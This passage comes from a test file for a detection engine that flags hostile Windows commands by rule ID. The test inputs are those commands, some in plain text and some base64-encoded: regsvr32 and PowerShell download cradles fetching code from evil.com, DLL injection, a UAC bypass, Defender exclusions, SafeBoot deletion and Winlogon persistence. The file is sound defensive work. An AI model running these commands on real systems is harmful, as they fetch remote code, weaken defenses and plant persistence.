	it("detects regsvr32 /i:http (WIN-CMD-050)", () => {
		expect(
			matchCommand(engine, decodeCommand("cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL2V2aWwuY29tL2ZpbGUuc2N0IHNjcm9iai5kbGw=")),
		).toContain("CLT-WIN-CMD-050");
	});

	it("detects Mavinject64.exe (WIN-CMD-051)", () => {
		expect(
			matchCommand(engine, decodeCommand("QzpcV2luZG93c1xNYXZpbmplY3Q2NC5leGUgMTIzNCAvSU5KRUNUUlVOTklORyBldmlsLmRsbA==")),
		).toContain("CLT-WIN-CMD-051");
	});

	it("detects inject_dll_x86.exe (WIN-CMD-052)", () => {
		expect(matchCommand(engine, decodeCommand("QzpcdG9vbHNcaW5qZWN0X2RsbF94ODYuZXhl"))).toContain("CLT-WIN-CMD-052");
	});

	it("detects PowerShdll.dll (WIN-CMD-053)", () => {
		expect(matchCommand(engine, decodeCommand("cnVuZGxsMzIuZXhlIFBvd2VyU2hkbGwuZGxsLG1haW4="))).toContain("CLT-WIN-CMD-053");
	});

	it("detects SyncAppvPublishingServer iex (WIN-CMD-054)", () => {
		expect(matchCommand(engine, decodeCommand("U3luY0FwcHZQdWJsaXNoaW5nU2VydmVyLnZicyAiQnJlYWs7IGlleCBjbWQi"))).toContain(
			"CLT-WIN-CMD-054",
		);
	});

	it("detects sdclt.exe UAC bypass (WIN-CMD-055)", () => {
		expect(matchCommand(engine, decodeCommand("c2RjbHQuZXhl"))).toContain("CLT-WIN-CMD-055");
	});

	// --- PowerShell techniques (WIN-CMD-056..061) ---

	it("detects powershell iex $env (WIN-CMD-056)", () => {
		expect(matchCommand(engine, decodeCommand("cG93ZXJzaGVsbCBpZXggJGVudjpjb21zcGVj"))).toContain("CLT-WIN-CMD-056");
	});

	it("detects powershell -Version downgrade (WIN-CMD-057)", () => {
		expect(matchCommand(engine, decodeCommand("cG93ZXJzaGVsbCAtVmVyc2lvbiAyIC1Db21tYW5kIEdldC1Qcm9jZXNz"))).toContain(
			"CLT-WIN-CMD-057",
		);
	});

	it("detects powershell iex downloadstring cradle (WIN-CMD-058)", () => {
		expect(
			matchCommand(
				engine,
				"powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')",
			),
		).toContain("CLT-WIN-CMD-058");
	});

	it("detects powershell Reflection.Assembly Load (WIN-CMD-059)", () => {
		expect(matchCommand(engine, decodeCommand("cG93ZXJzaGVsbCBbUmVmbGVjdGlvbi5Bc3NlbWJseV06OkxvYWQoJGJ5dGVzKQ=="))).toContain(
			"CLT-WIN-CMD-059",
		);
	});

	it("detects powershell cert validation bypass (WIN-CMD-060)", () => {
		expect(
			matchCommand(
				engine,
				"powershell [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }",
			),
		).toContain("CLT-WIN-CMD-060");
	});

	it("detects powershell GetTypeFromCLSID (WIN-CMD-061)", () => {
		expect(
			matchCommand(
				engine,
				"powershell [Type]::GetTypeFromCLSID('72C24DD5-D70A-438B-8A42-98424B88AFB8')",
			),
		).toContain("CLT-WIN-CMD-061");
	});

	// --- Extended bcdedit/recovery (WIN-CMD-033 merge) ---

	it("detects bcdedit bootems off (WIN-CMD-033)", () => {
		expect(matchCommand(engine, decodeCommand("YmNkZWRpdCAvc2V0IGJvb3RlbXMgb2Zm"))).toContain("CLT-WIN-CMD-033");
	});

	it("detects reg delete SafeBoot (WIN-CMD-033)", () => {
		expect(
			matchCommand(engine, decodeCommand("cmVnIGRlbGV0ZSBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNhZmVCb290IC9m")),
		).toContain("CLT-WIN-CMD-033");
	});

	it("detects reg add Winlogon Userinit (WIN-CMD-033)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Userinit /d evil.exe",
			),
		).toContain("CLT-WIN-CMD-033");
	});

	// --- Extended Defender settings (WIN-CMD-037 merge) ---

	it("detects Add-MpPreference -Exclusion (WIN-CMD-037)", () => {
		expect(matchCommand(engine, decodeCommand("QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCBDOlxtYWx3YXJl"))).toContain(
			"CLT-WIN-CMD-037",
		);
	});
});
